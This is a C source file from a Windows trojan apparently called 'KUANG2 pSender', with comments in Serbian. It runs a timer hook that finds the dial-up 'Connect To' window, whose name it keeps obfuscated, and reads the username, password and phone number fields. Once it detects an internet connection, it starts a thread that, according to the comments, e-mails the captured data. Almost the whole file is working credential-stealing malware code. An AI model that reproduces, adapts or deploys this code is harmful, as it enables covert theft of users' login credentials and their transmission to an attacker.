/***[ThuNderSoft]*************************************************************
						  KUANG2 pSender: message loop
								     WEIRD
*****************************************************************************/

#include <windows.h>
#include <strmem.h>
#include <tools.h>
#include <win95e.h>

// ovo je max dužina stringa za svaki od unosa
#define MAXSTR 1024

// broj milisekundi između dva ulaska u DUPhook (5000)
#define TIME 5000
// određuje posle koliko ulazaka u DUPhook poziva deo koji radi sa mrežom (12000)
#define NETTIME 12


HWND hWnd;
volatile BOOL unutra;

extern void (*InstallHook) (void);
extern void (*UnHook) (void);

char buff[5120];
char temp[1024];

char connect_to[]={		// "Connect To";
	0x34, 0xF6, 0xE6, 0xE6, 0x56, 0x36, 0x47, 0x02, 0x45, 0xF6, 0x00};


int brojac, time4Net;
char lastIP[]="a3d$Sp 32p dpcl"; // zadnji IP
char tempIP[]="dm__eodU#dsWQw"; // temp IP (tekući)
char hostIP[]="127.0.0.1";       // host IP
char newlines[]={0x0D, 0x0A, 0x0D, 0x0A, 0x00}; // 2 nove linije

BOOL SENDdunOK;		// TRUE ako smo nakon priključenja na internet uspešno obradili slanje DUN podataka
BOOL SENDpassOK;	// TRUE ako smo nakon priključenja na internet uspešno obradili slanje PASSWORD podataka


extern DWORD WINAPI SendThread (LPVOID param);

/*
	FindCnctName
	------------
  + Za dati "Connect To" nalazi ime konekcije i ostalo. */

BOOL CALLBACK FindCnctName(HWND hChild, LPARAM lParam)
{
	switch (brojac) {
		case 5:		// Username
			SendMessage(hChild, WM_GETTEXT, MAXSTR, (LPARAM) temp);
			strcopyFaddd(buff, temp, 0x0A0D);
			break;
		case 7:		// Password
			SendMessage(hChild, WM_GETTEXT, MAXSTR, (LPARAM) temp);
			straddFaddd(buff, temp, 0x0A0D);
			break;
		case 12:	// Tel
			SendMessage(hChild, WM_GETTEXT, MAXSTR, (LPARAM) temp);
			straddF(buff, temp);
			straddF(buff, newlines);
			return FALSE;
	}
	brojac++;
	return TRUE;
}

/*
	DupHook
	-------
  + Ovde je glavna radnja: prati DUP prozore i čita podatke i tako to.
  + Dolazi ovde svakih TIME milisekundi - to je minimalno vreme koje mora da
	protekne između poziva 'Connect To' prozora i konačnog logovanja na
	mrežu. Ovo je sasvim dovoljno vreme, čak može i više da se uzme.
  + Šta se dešava ako korisnik ima neki alternativni način logovanja?
	Ako prethodno nije koristio 'Connect To' buf[0] bi trebalo da bude 0
	i situacija se beleži i šalje se IP. Ako je prethodno nekad bio
	'Connect To' onda su ti podaci i dalje prisutni ali, pošto su obrađeni
	nema frke da će ih slati ponovo */

void DUPhook(void)
{
	HWND hCT;			// handle na 'Connect To'
	struct hostent *H;
	DWORD threadID;


	unutra=TRUE;		// označi da smo unutra, da ne bi ponovo ušli

/******************************* WatchDog mode ******************************/

	hCT=FindWindow(NULL, connect_to);	// FindWindows je MNOGO brže nego EnumWindows (÷ 2x brže)
	if (hCT) {
		time4Net=brojac=0;
		EnumChildWindows(hCT, FindCnctName, 1); // enumeriši - dok ne završiš nema dalje
	}

/********************************* NetDetect ********************************/

	if (time4Net++ >= NETTIME) {// Da li je došlo vreme da se proverava mreža?
		time4Net=0;				// da, resetuj brojac

		if (gethostname(temp, 1024))	// uzmi ime hosta
			goto dhend_err;				// nešto nije bilo u redu

		H=gethostbyname(temp);			// nađi IP hosta
		if (H==NULL) goto dhend_err;	// nema IPa - verovatno nismo na mreži

		strcopyF(tempIP, inet_ntoa(*(struct in_addr *)H->h_addr));	// našli smo IP

		if (!strcompF(tempIP, hostIP))
			goto dhend_err;				// sigurno nismo na mreži jer su isti

/****************************** I am on the Net *****************************/

		if (!strcompF(tempIP, lastIP)) goto dhend;	// trenutni IP je isti kao i zapamćeni -> izađi

		// Sada smo na mreži po prvi put nakon uključenja na nju! Zato
		// kreiram thread da oslobodim sam program koji proverava da li je
		// ova konekcija bila i ako nije da pošalje podatke na e-mail.

		// Kreiramo thread zadužen za slanje podataka.
		CreateThread(NULL, 0, SendThread, NULL, 0, &threadID);

		return;						// samo izađi - 'unutra' ostaje TRUE!

dhend_err:
		SENDdunOK=SENDpassOK=FALSE;		// neka greška je bila ili nismo na netu
		lastIP[0]=0;					// zato resetuj sve flagove
	}
dhend:
	unutra=FALSE;					// nismo više unutra
	return;
}



/*
	WndProc
	-------
  þ message loop */

LRESULT CALLBACK WndProc (HWND hw, unsigned msg, WPARAM wParam, LPARAM lParam)
{
	switch (msg) {

		case WM_CREATE:
//MsgBox("You are working under KUANG2 pSender FULL *TEST* version");
			hWnd = hw;
			unutra=FALSE;								// nismo unutra
			buff[0]=temp[0]=lastIP[0]=time4Net=0;		// resetuj sve
			SENDdunOK=SENDpassOK=FALSE;					// resetuj i ove flagove
			strdecryptS(connect_to);					// dekriptuj
			SetTimer(hWnd, 1, TIME, NULL);				// postavi tajmer
			if (InstallHook) (*InstallHook)();			// pokreni hook
			break;

		case WM_TIMER:
			if (!unutra)			// ako nismo već unutra
				DUPhook();			// pozovi f-ju koja radi...
//			else MessageBeep(MB_OK);
			break;

		case WM_DESTROY:
			if (UnHook) (*UnHook)();
			KillTimer(hWnd, 1);
			PostQuitMessage(0);		// kraj ???
			break;

		default:
			return (DefWindowProc(hw, msg, wParam, lParam));
	}
	return 0;
}
